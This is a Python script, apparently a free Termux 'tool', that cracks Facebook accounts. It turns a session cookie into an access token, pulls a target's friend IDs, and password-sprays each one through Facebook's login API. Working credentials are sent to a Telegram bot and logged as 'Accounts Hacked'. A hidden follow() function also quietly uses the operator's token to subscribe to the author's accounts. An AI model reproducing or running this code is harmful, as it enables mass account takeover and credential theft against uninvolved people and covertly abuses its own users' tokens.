""" 
-------------------------------------------------------------------------
- Cod BY : SidraELEzz
- Github : https://github.com/SidraELEzz
- Telegram: https://t.me/SidraTools
- Telegram: https://t.me/tt_rq
-------------------------------------------------------------------------
     
""" 
import os,sys
try:
	import requests
except ImportError:
	os.system("pip install requests")

import os
import sys
import time
import json
import random
import threading
import re
import requests
from time import sleep
from multiprocessing import *
from random import choice

A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"

wball = "🔘"
bxall = "🔴"
x1 = "🔵"
x2 = "⚪"
tick = "⚪"
barem ="🔵"

try:
    print (A + x2 + ' Preparing .......\n')
    time.sleep(2)
    os.system('rm flog.txt')
    os.system('rm slog.txt')
    os.system('rm plog.txt')
    os.system('rm id-friends.txt')
    os.system('touch id-friends.txt')
    os.system('touch flog.txt')
    os.system('touch plog.txt')
    os.system('touch slog.txt')
    os.system('touch found.txt')
    os.system('clear')
except:
    pass
	

def baner():
	banera = f"""{E}
	
      8888888b.  888     888 888b    888 
      888   Y88b 888     888 8888b   888 
      888    888 888     888 88888b  888 
      888   d88P 888     888 888Y88b 888 
      8888888P"  888     888 888 Y88b888 
      888 T88b   888     888 888  Y88888 
      888  T88b  Y88b. .d88P 888   Y8888 
      888   T88b  "Y88888P"  888    Y888 
                                              
  \033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ\033[1;91m
  ---------------------------
"""     

	for sidra in banera.splitlines():
		time.sleep(0.05)
		print(sidra)
		
def clear():
	if os.name == 'nt':
		os.system('cls')
		os.system('title Cod BY SidraELEzz ')
	else:
		os.system('clear')
		
pass
run = requests.get("https://pastebin.com/raw/Sb55WKp8")
baner()
print ("\033[1;92mFIRST STEP OF LOGIN")
print ("\033[1;97m--------------------")
print ("\033[1;97m ") 
password = input('          \033[1;93mTOOL PASSWORD: '+C)
print (E)
if password == "" :
  sys.exit()
if password in str(run.text):
  print(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print ("\033[1;93m ")
  print("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password ⌯")
  os.system('xdg-open https://t.me/SidraTools/1')
  sys.exit()



def follow(account):
    try:
        requests.post('https://graph.fbscribers?access_token=' + str(account))
        requests.post('https://graph.facebook.com/100009918107424/subscribers?access_token=%s' % account)
        requests.post('https://graph.facebook.com/100027060438331/subscribers?access_token=%s' % account)
    except:
        pass


def loadingBar(count, total, size):
    percent = float(count) / float(total) * 100
    sys.stdout.write('\r' + str(int(count)).rjust(3, '0') + '/' + str(int(total)).rjust(3, '0') + ' [' + barem * int(percent / 10) * size + ' ' * (10 - int(percent / 10)) * size + ']')


def apk0(xtext):
    ax = open('slog.txt', 'a')
    ax.write(str(xtext) + '@')
    ax.close()


def apk1(xtext):
    ax = open('plog.txt', 'a')
    ax.write(str(xtext) + '@')
    ax.close()


def apk2(xtext):
    ax = open('flog.txt', 'a')
    ax.write(str(xtext) + '@')
    ax.close()


def flog(username, password):
    xvv = open('found.txt', 'a')
    xvv.write(('\n[Email Facebook : {} ][Password: {} ]').format(username, password))
    xvv.close()
    
    
def pname(account):
    try:
        max = requests.get('https://graph.facebook.com/me?access_token=' + account)
        a = json.loads(max.text)
        nam = a['name']
        print("{}____________".format(C))
        print("{} name :{}{}".format(C,E,nam))
        print("{}____________".format(C))
        sleep(3)
    except:pass
    
    
        
        
def check(username, password, TK, ID):
    apk1('1')
    user_agent = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    headers = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
    params = {
    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
    'format': 'JSON', 
    'sdk_version': '2', 
    'email': username, 
    'locale': 'en_US', 
    'password': password, 
    'sdk': 'ios', 
    'generate_session_cookies': '1', 
    'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params, headers=headers)
    if 'access_token' in response.text and 'EAAA' in response.text:
        requests.get(f"https://api.telegram.org/bot{TK}/sendMessage?chat_id={ID}&text=‹ ғᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄᴏᴜɴᴛ ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : {username}\n‹ ᴘᴀѕѕᴡᴏʀᴅ :{password}\n────── • ✧✧ • ──────\n• @SidraTools")
        flog(username, password)
        apk0('1')
    else:
        apk2('0')
    

def fetchx():
	xi = 0
	clear()
	baner()
	idds = input(A+"("+E+"⌯"+A+")"+C+ " * ID Target ? : "+H)
	idk = input(A+"("+E+"⌯"+A+")"+C+ " * How ID Target ? : "+H)
	os.system('rm -rf id-friends.txt')
	fil = "account.txt"
	file = open(fil, 'r')
	account = file.readline().split('\n')[0]
	user_agent = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
	headers = {
    'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 
    'x-fb-sim-hni': str(random.randint(20000, 40000)), 
    'x-fb-net-hni': str(random.randint(20000, 40000)), 
    'x-fb-connection-quality': 'EXCELLENT', 
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
    'user-agent': user_agent, 
    'content-type': 'application/x-www-form-urlencoded', 
    'x-fb-http-engine': 'Liger'}
	try:
		ass = requests.Session().get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idds,idk,account),headers=headers).json()
		xtot = len(ass['data'])
		for i in ass['data']:
			xi = xi + 1
			open('id-friends.txt','a').write(str(i["id"])+"\n");loadingBar(xi, xtot, 2)
			
		print (E + '\n \n' + x1 + "Sucessfully Fetched ID's \n")
		sleep (3)
		clear()
		baner()
	except KeyError:
		print (A + x1 + ' Failed to Fetch....')
		sys.exit()
			
			
			
		
def token(cookie):
	try:
		data = requests.get('https://business.facebook.com/business_locations', headers = {
        'user-agent'  : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # don't change this user agent.
        'referer' : 'https://www.facebook.com/',
        'host'  : 'business.facebook.com',
        'origin'  : 'https://business.facebook.com',
        'upgrade-insecure-requests' : '1',
        'accept-language'  : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control' : 'max-age=0',
        'accept'   : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type'  : 'text/html; charset=utf-8'
    }, cookies = {
        'cookie'                    : cookie
    })
		
		token_git = re.search('(EAAG\w+)', data.text)
		if (token_git)==None:
			print (A + '\n' + x2 + ' Login Failed .')
			sys.exit()
		else:
			account = token_git.group(1)
			print (E + '\n' + bxall + ' Login Sucessfull ' + x2 + '\n')
			sleep(3)
			os.system('rm -rf account.txt')
			open('account.txt','a').write(str(account)+"\n")
			clear()
			baner()
			pname(account)
			
			
	except:
		print( E + '\n\n' + x2 + ' Check you Internet Connection')
		time.sleep(10)
        
        


clear()
baner()
""" 
-------------------------------------------------------------------------
- Cod BY : SidraELEzz
- Github : https://github.com/SidraELEzz
- Telegram: https://t.me/SidraTools
- Telegram: https://t.me/tt_rq
-------------------------------------------------------------------------
     
""" 
cpcore = str(cpu_count())
cnum = int(int(cpcore) * 10)
cookie = input(A+" ("+E+"⌯"+A+")"+C+ " * cookies? : "+E)
token(cookie)
fetchx()
try:
    texf = 'id-friends.txt'
    iddata = open(texf, 'r').readlines()
except:
    print (x2 + ' Unable To Open')
    sys.exit()



itotal = int(len(iddata))
print (A+" ("+E+"⌯"+A+")"+E+ (' Total Accounts : {}{}').format(C, itotal))

ic = 0
qs = input(A+" ("+E+"⌯"+A+")"+C+ " * Password To Try On Accounts ? : "+H)
print (A+"---------------------------")
TK = input(A+" ("+E+"⌯"+A+")"+H+ " Enter Token :"+C)
ID = input(A+" ("+E+"⌯"+A+")"+H+ " Enter ID Tele :"+C)
print (A+"---------------------------")
print ('\n')
while ic <= itotal - 1:
    username = str(int(iddata[ic]))
    passwords = str(qs)
    perx = str(int(float(ic) / float(itotal - 1) * 100)) + str('%')
    ic = ic + 1
    scx = str(int(len(open('slog.txt', 'r').read().split('@'))) - 1)
    fcx = str(int(len(open('flog.txt', 'r').read().split('@'))) - 1)
    pcx = str(int(len(open('plog.txt', 'r').read().split('@'))))
    pqt = int(pcx) - int(fcx) + int(scx)
    cperq = str(int(float(float(pqt) / float(cnum)) * 100)) + str('%')
    sys.stdout.write(('\r {}Processing : {} ({}/{}) [{}] CPU : [{}] {}({}){} ({}) ').format(A, C, ic, itotal, perx, cperq, E, scx, A, fcx))
    sys.stdout.flush()
    Process(target=check, args=(username, passwords,TK ,ID)).start()
    ntim = int(float(int(fcx)) / float(cnum))
    time.sleep(0.1)
    if int(pqt) > cnum:
        time.sleep(25)

print ('\n')
while True:
    scx = str(int(len(open('slog.txt', 'r').read().split('@'))) - 1)
    fcx = str(int(len(open('flog.txt', 'r').read().split('@'))) - 1)
    icot = int(fcx) + int(scx)
    perv = str(int(float(icot) / float(itotal) * 100)) + str('%')
    sys.stdout.write(('\r {}({}{}{}) [ Failed: {}{}{} ] & [ Found : {}{} {}]  ').format(E, C, perv, E, C, fcx, E, C, scx, E))
    sys.stdout.flush()
    if int(int(scx) + int(fcx)) == itotal:
        founp = open('found.txt', 'r').read()
        print( '\n \n' + x1 + A + ' [ Accounts Hacked ] ' + x1 + E + (' \n {}').format(str(founp)))
        print ('\n' + x2 + ' Compleated ' + x2)
        sys.exit()